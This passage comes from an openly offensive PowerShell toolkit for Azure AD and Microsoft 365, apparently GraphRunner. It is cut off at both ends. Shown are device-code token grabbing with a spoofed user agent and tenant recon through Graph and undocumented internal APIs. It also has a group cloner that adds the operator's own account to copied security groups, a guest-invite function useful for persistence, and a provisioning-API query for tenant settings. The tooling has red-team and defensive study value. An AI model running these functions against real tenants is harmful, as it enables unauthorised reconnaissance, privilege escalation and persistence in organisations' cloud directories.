            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                write-host -ForegroundColor Yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                $accesstoken = $tokens.access_token
                $refreshToken = $tokens.refresh_token
                break
            }
        Start-Sleep -Seconds 3
    }
}    

   
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"

# Get full service principal list

$initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
$headers = @{"Authorization" = "Bearer $accesstoken"}

# Initialize an array to store all collected data
$allData = @()

# Loop until there's no more nextLink
do {
    # Invoke the web request
    $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers

    # Convert the response content to JSON
    $jsonData = $response.Content | ConvertFrom-Json

    # Add the current page's data to the array
    $allData += $jsonData.value

    # Check if there's a nextLink
    if ($jsonData.'@odata.nextLink') {
        $initialUrl = $jsonData.'@odata.nextLink'
    } else {
       
        break
    }
} while ($true)

$appDisplayNameToSearch = "Microsoft Graph"
$graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
$graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
Write-Output "Graph ID: $graphId"
Write-Output "Internal Graph ID: $graphIdInternal"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects..."
$spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
$spnsjson = $spns.Content | ConvertFrom-Json

# Construct the Graph API endpoint
$graphApiUrl = "https://graph.microsoft.com/v1.0"

Write-Host -ForegroundColor yellow "[*] App Registrations:"

# Query app registrations
$appRegistrations = Invoke-RestMethod -Uri "$graphApiUrl/applications" -Headers @{ Authorization = "Bearer $accessToken" }

# Separator
            Write-Host ("=" * 80) 

# Loop through each app registration
foreach ($app in $appRegistrations.value) {
    $appId = $app.appId
    $appName = $app.displayName
    $createtime = $app.createdDateTime
    $signinaudience = $app.signInAudience
    
    # Query users who have consented to the app's permissions
    $approleurl = ($graphApiUrl + "/servicePrincipals(appId='" + $appId + "')/appRoleAssignedTo")
    $consentedUsers = Invoke-RestMethod -Uri $approleurl -Headers @{ Authorization = "Bearer $accessToken" }
    
    # Display app information and consented users
    Write-Host "App Name: $appName (App ID: $appId)"
    Write-Host "Creation Date: $createtime"
    Write-Host "Sign-In Audience: $signinaudience"
    foreach ($user in $consentedUsers.value) {
        $userId = $user.principalId
        $userDisplayName = $user.principalDisplayName
        Write-Host "Consented User: $userDisplayName (User ID: $userId)"
    }
    # Loop through each resource access entry
    foreach ($resourceAccess in $app.requiredResourceAccess) {
        $resourceAppId = $resourceAccess.resourceAppId
        $appscopes = @()
        $delegatedscopes = @()

        # Loop through each resource access item
        foreach ($accessItem in $resourceAccess.resourceAccess) {
            $scopeGuid = $accessItem.id
            
            # Use the spn list to find names of permissions
            foreach($approle in $spnsjson.appRoles){
                if ($scopeGuid -like $approle.id) {
                    $scopeName = $approle.value
                    $appscopes += $scopeName
                }
            }
            foreach($scoperole in $spnsjson.oauth2PermissionScopes){
                if ($scopeGuid -like $scoperole.id) {
                    $dscopeName = $scoperole.value
                    $delegatedscopes += $dscopeName
                }
            }
        }

        # Display the resource app ID and associated permission names (scopes)
        if ($appscopes.Count -gt 0) {
            Write-Host "App Permissions (Scopes): $($appscopes -join ', ')"
        }
        if ($delegatedscopes -gt 0) {
            Write-Host "Delegated Permissions (Scopes): $($delegatedscopes -join ', ')"
        }
    }
    Write-Host ""
    # Separator
            Write-Host ("=" * 80) 
} 

        Write-Host -ForegroundColor yellow "[*] Now looking for external apps. Any apps displayed below are not owned by the current tenant or Microsoft's main app tenant."
        Write-Host ("=" * 80) 

        $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
        $tenantid = $orginfo.value.id

        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $unsupurl = "https://main.iam.ad.ext.azure.com"

        $unsupbody = @{
                "resource" = "74658136-14ec-4630-ad9b-26e160ff0fc6"
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "grant_type" =    "refresh_token"
                "refresh_token" = $refreshToken
                "scope"=         "openid"
            }

        $unsuptokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $unsupbody
        $unsupaccesstoken = $unsuptokens.access_token

    foreach ($serviceprincipal in $allData){
        $EntAppsScope = ""
        # Filter out Microsoft Tenant service principals like Kaizala, Teams, etc... MS Tenant = f8cdef31-a31e-4b4a-93e4-5f571e91255a
        if ($serviceprincipal.AppOwnerOrganizationId -ne "f8cdef31-a31e-4b4a-93e4-5f571e91255a" -and $serviceprincipal.AppOwnerOrganizationId -ne $tenantid)
        {
           $body = @{
            "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "resource" =      "74658136-14ec-4630-ad9b-26e160ff0fc6"
        }
            $unsupheaders = @{
                "Authorization"          = "Bearer " + $unsupaccesstoken
                "Content-type"           = "application/json"
                "X-Requested-With"       = "XMLHttpRequest"
                "x-ms-client-request-id" = [guid]::NewGuid()
                "x-ms-correlation-id"    = [guid]::NewGuid()
            }

            $unsupfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=User&userObjectId=")
            $EntAppsScope = Invoke-RestMethod -Method GET -Uri $unsupfullurl -Headers $unsupheaders

            $unsupAdminfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=Admin&userObjectId=")
            $EntAppsAdminScope = Invoke-RestMethod -Method GET -Uri $unsupAdminfullurl -Headers $unsupheaders
            
            

            Write-Host ("External App: " + $serviceprincipal.displayName)
            Write-Host ("AppId: " + $serviceprincipal.AppId)
            Write-Host ("Object ID: " + $serviceprincipal.Id)
            Write-Host ("appOwnerOrganizationId: " + $serviceprincipal.appOwnerOrganizationId)
            Write-Host ("Creation Date: " + $serviceprincipal.createdDateTime)
            Write-Host "Scope of Consent:"
            Foreach ($Entscopeitem in $EntAppsScope){
            $principals = @()
            foreach($userorgroup in $Entscopeitem.principalIds){
                $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                $principals += $userobject.userPrincipalName
            }
            Write-Host ($Entscopeitem.permissionId + ", " + $Entscopeitem.permissionType + ", " + $($principals -join '; '))
            }
            Foreach ($Entscopeadminitem in $EntAppsAdminScope){
            $principals = @()
            foreach($userorgroup in $Entscopeadminitem.principalIds){
                $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                $principals += $userobject.userPrincipalName
            }
            Write-Host ($Entscopeadminitem.permissionId + ", " + $Entscopeadminitem.permissionType + ", " + $($principals -join '; '))
            }
            Write-Host ""
            Write-Host ("=" * 80) 
        }
        
    }
}



function Get-SecurityGroups{
param (
        [string] $AccessToken
    )
$headers = @{
    Authorization = "Bearer $accessToken"
}

Write-Host -ForegroundColor Yellow "[*] Now getting a list of groups along with members from the directory..."

# Get all groups and group types
$graphApiUrl = "https://graph.microsoft.com/v1.0"
$groupsUrl = "$graphApiUrl/groups?$filter=securityEnabled eq true"

$groupsResponse = Invoke-RestMethod -Uri $groupsUrl -Headers $headers -Method Get

$groups = $groupsResponse.value


#Get Group Members

$groupsWithMemberIDs = @()

foreach ($group in $groups) {
    $groupId = $group.id
    $membersUrl = "$graphApiUrl/groups/$groupId/members"

    $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
    $members = $membersResponse.value

    $memberIds = $members | ForEach-Object { $_.id }

    $groupInfo = @{
        GroupName = $group.displayName
        MemberIds = $memberIds -join ","
    }
    Write-Host ("Group Name: " + $group.displayName + " | Members: " + ($($members.userPrincipalName) -join ', '))
    Write-Host ""
    Write-Host ("=" * 80) 
    $groupsWithMemberIDs += New-Object PSObject -Property $groupInfo
}

return $groupsWithMemberIDs

}


function Create-SecurityGroupWithMembers {
    param (
        [string] $AccessToken,
        [string] $DisplayName,
        [string[]] $MemberIds
    )

    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $createGroupUrl = "$graphApiUrl/groups"

    $headers = @{
        Authorization = "Bearer $AccessToken"
        "Content-Type" = "application/json"
    }

    $groupProperties = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupData = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupJson = $groupData | ConvertTo-Json

    $response = Invoke-RestMethod -Uri $createGroupUrl -Headers $headers -Method Post -Body $groupJson

    if ($response -ne $null) {
        Write-Host -ForegroundColor Green "Security Group '$DisplayName' created successfully."
    } else {
        Write-Error "Error creating the security group."
    }
}



function Invoke-SecurityGroupCloner{

<#
    .SYNOPSIS
        Clones a security group in Azure Active Directory and allows you to add your own account.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Clones a security group in Azure Active Directory and allows you to add your own account.

    .EXAMPLES      
        
        C:\PS> Invoke-SecurityGroupCloner -Tokens $tokens
#>

Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [object[]]
    $Tokens = ""

  )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        $accesstoken = $tokens.access_token
        $refreshtoken = $tokens.refresh_token
    }
    else{

        # Login
        Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to clone a group as."

        $body = @{
            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "resource" =      "https://graph.microsoft.com"
        }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while($continue)
                {
    
            $body=@{
                "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                "code" =       $authResponse.device_code
            }
            try{
            $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
            }
            catch{
            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Output $details.error
            }
            if($tokens)
                {
                    write-host -ForegroundColor yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                    $accesstoken = $tokens.access_token
                    break
                }
            Start-Sleep -Seconds 3
        }    
    }

$headers = @{
    Authorization = "Bearer $accessToken"
}

$secgroups = Get-SecurityGroups -AccessToken $accessToken
$CloneGroup = ""
while($CloneGroup -eq ""){
Write-Host -ForegroundColor Cyan "[*] Enter a group name you want to clone:"
$CloneGroup = Read-Host 

if ($secgroups.GroupName -contains $CloneGroup) {
    Write-Host -ForegroundColor yellow ("[*] Found group " + $CloneGroup)
} else {
    Write-Output "Invalid group try again."
    $CloneGroup = ""
}
}

$memberIds = @()
foreach ($group in $secgroups){
    If ($group.GroupName -eq $cloneGroup){
        $memberlist = $group.memberIds.split(",")
        foreach($member in $memberlist){
            $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $member )
        }
    }
}
Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
$answer = Read-Host 
$answer = $answer.ToLower()
if ($answer -eq "yes" -or $answer -eq "y") {
    Write-Host -ForegroundColor yellow "[*] Adding current user to the cloned group..."
    $currentuser = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
    $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $currentuser.Id)
} elseif ($answer -eq "no" -or $answer -eq "n") {
    Write-Output "[*] Not adding your user"
} else {
    Write-Output "Invalid input. Please enter Yes or No."
}

$memberIdsUniq = $memberIds | Select-Object -Unique

Create-SecurityGroupWithMembers -AccessToken $accessToken -DisplayName $CloneGroup -MemberIds $memberIdsUniq
}



function Invite-GuestUser{

<#
    .SYNOPSIS
        Invites a guest user to an Azure Active Directory tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Invites a guest user to an Azure Active Directory tenant.

    .EXAMPLES      
        
        C:\PS> Invite-GuestUser -Tokens $tokens -DisplayName "Lord Voldemort" -EmailAddress "iamlordvoldemort@31337schoolofhackingandwizardry.com"
#>

    Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $DisplayName = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $EmailAddress = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $RedirectUrl = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $SendInvitationMessage = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $CustomMessageBody = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [object[]]
    $Tokens = ""

    )
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        $accesstoken = $tokens.access_token
        $refreshtoken = $tokens.refresh_token
    }
    else{
    Write-Host -ForegroundColor yellow "[*] Initiating a device code login"

        $body = @{
            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "resource" =      "https://graph.microsoft.com"
        }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while($continue)
                {
    
            $body=@{
                "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                "code" =       $authResponse.device_code
            }
            try{
            $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
            }
            catch{
            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Output $details.error
            }
            if($tokens)
                {
                    write-host -ForegroundColor Yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                    $accesstoken = $tokens.access_token
                    $refreshToken = $tokens.refresh_token
                    break
                }
            Start-Sleep -Seconds 3
        }
    }
    $headers = @{"Authorization" = "Bearer $accesstoken"}
    # Construct the Graph API endpoint
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
    $tenantid = $orginfo.value.id


    # Prompt user for input
    if(!$EmailAddress){
    $EmailAddress = Read-Host "Enter the Email Address to Invite"
    }

    if(!$DisplayName){
    $DisplayName = Read-Host "Enter the Display Name"
    }

    if(!$RedirectUrl){
    $RedirectUrl = Read-Host "Enter the Redirect URI (leave blank to use the default)"
    }
    if($RedirectUrl -eq ""){
    $RedirectUrl = ("https://myapplications.microsoft.com/?tenantid=" + $tenantid)
    }

    if(!$SendInvitationMessage){
    $SendInvitationMessage = Read-Host "Send an Email Invitation? (true/false)"
    }

    if (!$CustomMessageBody){
    $CustomMessageBody = Read-Host "Enter a custom message body or leave blank"
    }

    # Construct the JSON payload
    $invitationData = @{
        invitedUserEmailAddress = $EmailAddress
        invitedUserDisplayname = $Displayname
        inviteRedirectUrl = $RedirectUrl
        sendInvitationMessage = [System.Convert]::ToBoolean($SendInvitationMessage)
        invitedUserMessageInfo = @{
            customizedMessageBody = $MessageBody
        }
    }

    # Convert to JSON format
    $invitationJson = $invitationData | ConvertTo-Json


    # Make the POST request
    $response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/invitations" -Method Post -Headers $headers -Body $invitationJson

    # Check the response
    if ($response -ne $null) {
        Write-Host -ForegroundColor Green "[*] External user invited sent successfully."
        Write-Host ("Display Name: " + $response.invitedUserDisplayName)
        Write-Host ("Email Address: " + $response.invitedUserEmailAddress)
        Write-Host ("Object ID: " + $response.invitedUser.id)
        Write-Host ("Invite Redeem URL: " +  $response.inviteRedeemUrl)
    } else {
        Write-Error "Error sending invitation."
    }
}



function Invoke-GraphRecon{

<#
    .SYNOPSIS
        PowerShell module to perform general recon via the Azure AD Graph API.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       PowerShell module to perform general recon via the Azure AD Graph API.

    .EXAMPLES      
        
        C:\PS> Invoke-GraphRecon -Tokens $tokens
#>

param(
    [Parameter(Position = 0, Mandatory = $False)]
    [object[]]
    $Tokens = ""
)
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        $accesstoken = $tokens.access_token
        $refreshtoken = $tokens.refresh_token
        Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
        $RefreshToken = $tokens.refresh_token
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.windows.net"
                "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "user_impersonation"
            }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    }
    if($reftokens)
            {
               $aadtokens = $reftokens
               $access_token = $aadtokens.access_token
            }
    }
    else{

    # Login
    Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.windows.net"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
            "scope" = "user_impersonation"
        }
        try{
        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($aadtokens)
            {
                Write-Host "[*] Successful auth"
                $access_token = $aadtokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }
    }

# Generate unique GUIDs
$messageId = [guid]::NewGuid()
$trackingHeader = [guid]::NewGuid()
$clientId = "50afce61-c917-435b-8c6d-60aa5a8b8aa7"



$soapRequest = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/MsolConnect</a:Action>
    <a:MessageID>urn:uuid:$messageId</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$access_token</BearerToken>
      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
    </UserIdentityHeader>
    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$clientId</ClientId>
      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
    </ClientVersionHeader>
    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
    </ContractVersionHeader>
    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$trackingHeader</TrackingHeader>
    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
  </s:Header>
  <s:Body>
    <MsolConnect xmlns="http://provisioning.microsoftonline.com/">
      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <b:BecVersion>Version4</b:BecVersion>
        <b:TenantId i:nil="true"/>
        <b:VerifiedDomain i:nil="true"/>
      </request>
    </MsolConnect>
  </s:Body>
</s:Envelope>
"@


Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
# Send the SOAP request to the provisioningwebservice
$response = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest


if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
    $dataBlob = $Matches[1]
} else {
    Write-Host "DataBlob not found in the response."
}

$messageID = [guid]::NewGuid()
$trackingHeader = [guid]::NewGuid()

$GetCompanyInfoSoapRequest = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/GetCompanyInformation</a:Action>
    <a:MessageID>$MessageID</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Bearer $access_token</BearerToken>
      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
    </UserIdentityHeader>
    <BecContext xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <DataBlob xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$dataBlob</DataBlob>
      <PartitionId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">70</PartitionId>
    </BecContext>
    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$ClientId</ClientId>
      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
    </ClientVersionHeader>
    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
    </ContractVersionHeader>
    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$TrackingHeader</TrackingHeader>
    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
  </s:Header>
  <s:Body>
    <GetCompanyInformation xmlns="http://provisioning.microsoftonline.com/">
      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <b:BecVersion>Version16</b:BecVersion>
        <b:TenantId i:nil="true"/>
        <b:VerifiedDomain i:nil="true"/>
      </request>
    </GetCompanyInformation>
  </s:Body>
</s:Envelope>
"@

$companyinfo = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest


$xml = [xml]$companyInfo

# Define namespaces
$ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
$ns.AddNamespace("s", "http://www.w3.org/2003/05/soap-envelope")
$ns.AddNamespace("b", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService")
$ns.AddNamespace("c", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration")
$ns.AddNamespace("d", "http://schemas.microsoft.com/2003/10/Serialization/Arrays")
$ns.AddNamespace("ns", "http://schemas.microsoft.com/online/serviceextensions/2009/08/ExtensibilitySchema.xsd")


# Extract data using XPath
$displayName = $xml.SelectSingleNode("//c:DisplayName", $ns).InnerText
$street = $xml.SelectSingleNode("//c:Street", $ns).InnerText
$city = $xml.SelectSingleNode("//c:City", $ns).InnerText
$state = $xml.SelectSingleNode("//c:State", $ns).InnerText
$postalCode = $xml.SelectSingleNode("//c:PostalCode", $ns).InnerText
$Country = $xml.SelectSingleNode("//c:CountryLetterCode", $ns).InnerText
$TechnicalContact = $xml.SelectSingleNode("//c:TechnicalNotificationEmails", $ns).InnerText
$Telephone = $xml.SelectSingleNode("//c:TelephoneNumber", $ns).InnerText
$InitialDomain = $xml.SelectSingleNode("//c:InitialDomain", $ns).InnerText
$DirSync = $xml.SelectSingleNode("//c:DirectorySynchronizationEnabled", $ns).InnerText
$DirSyncStatus = $xml.SelectSingleNode("//c:DirectorySynchronizationStatus", $ns).InnerText
$DirSyncClientMachine = $xml.SelectSingleNode("//c:DirSyncClientMachineName", $ns).InnerText
$DirSyncServiceAccount = $xml.SelectSingleNode("//c:DirSyncServiceAccount", $ns).InnerText
$PasswordSync = $xml.SelectSingleNode("//c:PasswordSynchronizationEnabled", $ns).InnerText
$PasswordReset = $xml.SelectSingleNode("//c:SelfServePasswordResetEnabled", $ns).InnerText
$UsersPermToConsent = $xml.SelectSingleNode("//c:UsersPermissionToUserConsentToAppEnabled", $ns).InnerText
$UsersPermToReadUsers = $xml.SelectSingleNode("//c:UsersPermissionToReadOtherUsersEnabled", $ns).InnerText
$UsersPermToCreateLOBApps = $xml.SelectSingleNode("//c:UsersPermissionToCreateLOBAppsEnabled", $ns).InnerText
$UsersPermToCreateGroups = $xml.SelectSingleNode("//c:UsersPermissionToCreateGroupsEnabled", $ns).InnerText


Write-Host -ForegroundColor Yellow ("=" * 80) 
Write-Host -ForegroundColor Yellow "Main Contact Info"
Write-Host -ForegroundColor Yellow ("=" * 80) 
# Display the extracted data
Write-Host "Display Name: $displayName"
Write-Host "Street: $street"
Write-Host "City: $city"
Write-Host "State: $state"
Write-Host "Postal Code: $postalCode"
Write-Host "Country: $country"
Write-Host "Technical Notification Email: $TechnicalContact"
Write-Host "Telephone Number: $Telephone"
Write-Host -ForegroundColor Yellow ("=" * 80) 
Write-Host -ForegroundColor Yellow "Directory Sync Settings"
Write-Host -ForegroundColor Yellow ("=" * 80) 
Write-Host "Initial Domain: $initialDomain"
Write-Host "Directory Sync Enabled: $dirSync"
Write-Host "Directory Sync Status: $dirSyncStatus"
Write-Host "Directory Sync Client Machine: $dirSyncClientMachine"
Write-Host "Directory Sync Service Account: $dirSyncServiceAccount"
Write-Host "Password Sync Enabled: $passwordSync"
Write-Host -ForegroundColor Yellow ("=" * 80) 
Write-Host -ForegroundColor Yellow "User Settings"
Write-Host -ForegroundColor Yellow ("=" * 80) 
Write-Host "Self-Service Password Reset Enabled: $passwordReset"
Write-Host "Users Can Consent to Apps: $UsersPermToConsent"
Write-Host "Users Can Read Other Users: $UsersPermToReadUsers"
Write-Host "Users Can Create Apps: $UsersPermToCreateLOBApps"
Write-Host "Users Can Create Groups: $UsersPermToCreateGroups"


# Select the ServiceParameter nodes
$serviceParameters = $xml.SelectNodes("//ns:ServiceParameter", $ns)

Write-Host -ForegroundColor Yellow ("=" * 80) 
Write-Host -ForegroundColor Yellow "Additional Service Parameters"
Write-Host -ForegroundColor Yellow ("=" * 80) 
# Loop through each ServiceParameter node and extract the Name and Value
foreach ($parameter in $serviceParameters) {
    $name = $parameter.Name
